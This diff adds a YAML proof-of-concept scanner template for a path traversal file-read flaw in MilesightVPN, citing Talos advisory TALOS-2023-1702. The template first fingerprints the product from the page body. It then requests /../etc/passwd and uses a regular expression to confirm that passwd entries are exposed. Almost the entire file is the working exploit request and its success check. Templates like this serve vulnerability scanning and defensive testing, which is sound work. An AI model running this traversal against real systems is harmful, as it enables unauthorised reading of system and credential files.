@@ -1,0 +1,22 @@
+name: poc-yaml-milesight_vpn-fileread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /
+        expression: response.body_string.contains("MilesightVPN")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /../etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
+expression: r0() && r1()
+detail:
+    author: secking
+    links:
+        - https://talosintelligence.com/vulnerability_reports/TALOS-2023-1702
